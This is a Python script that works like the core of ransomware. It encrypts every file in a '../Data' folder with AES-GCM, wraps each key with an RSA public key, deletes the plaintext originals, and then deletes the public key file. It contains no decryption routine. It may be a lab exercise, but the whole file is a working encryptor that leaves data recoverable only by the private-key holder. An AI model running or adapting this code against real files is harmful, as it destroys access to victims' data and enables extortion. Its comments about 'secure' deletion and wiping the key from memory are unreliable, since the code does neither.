import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

DATA_FOLDER = "../Data"
PUBLIC_KEY_FILE = "asym_public_key.pem"

def load_rsa_public_key():
    try:
        with open(PUBLIC_KEY_FILE, "rb") as f:
            key_data = f.read()
        public_key = serialization.load_pem_public_key(key_data)
        return public_key
    except FileNotFoundError:
        print(f"[ERROR] {PUBLIC_KEY_FILE} not found!")
        exit()
    except Exception as e:
        print(f"[ERROR] Failed to load RSA key: {e}")
        exit()


def secure_delete(path):
    # Force delete file: bypass Recycle Bin on all OS
    try:
        if os.path.exists(path):
            os.remove(path)
    except Exception as e:
        print(f"[WARNING] Could not delete file {path}: {e}")


def encrypt_file(filepath, filename, public_key):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
    except Exception as e:
        print(f"[ERROR] Cannot read {filename}: {e}")
        return

    try:
        # Generate AES key
        aes_key = AESGCM.generate_key(bit_length=256)
        aesgcm = AESGCM(aes_key)
        nonce = os.urandom(12)

        ciphertext = aesgcm.encrypt(nonce, data, None)

        # Encrypt AES key with RSA-OAEP
        encrypted_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Write encrypted output file
        out_path = os.path.join(DATA_FOLDER, filename + ".enc")

        with open(out_path, "wb") as f:
            f.write(nonce)
            f.write(len(encrypted_key).to_bytes(4, "big"))
            f.write(encrypted_key)
            f.write(ciphertext)

        print(f"[✓] Encrypted : {filename} → {filename}.enc")

        # ⚠ Remove original plaintext
        secure_delete(filepath)

        # ⚠ Secure delete AES key from memory
        try:
            aes_key = b"\x00" * len(aes_key)
        except:
            pass  # not required but added for safety

    except Exception as e:
        print(f"[ERROR] Encryption failed for {filename}: {e}")


def encrypt_all_files(public_key):
    try:
        if not os.path.exists(DATA_FOLDER):
            print(f"[!] '{DATA_FOLDER}' folder missing.")
            return

        files = [f for f in os.listdir(DATA_FOLDER)
                 if os.path.isfile(os.path.join(DATA_FOLDER, f))]

        if not files:
            print(f"[!] No files to encrypt in {DATA_FOLDER}.")
            return

        print(f"\n=== Encrypting all files in '{DATA_FOLDER}/' ===")

        for filename in files:
            if filename.endswith(".enc"):
                print(f"[!] Skipping already encrypted file: {filename}")
                continue

            filepath = os.path.join(DATA_FOLDER, filename)
            encrypt_file(filepath, filename, public_key)

        print("\n[✓] Encryption process completed.")

        # ⚠ Remove public key after encryption
        secure_delete(PUBLIC_KEY_FILE)

    except Exception as e:
        print(f"[FATAL ERROR] Unexpected problem: {e}")
        exit()


if __name__ == "__main__":
    public_key = load_rsa_public_key()
    encrypt_all_files(public_key)
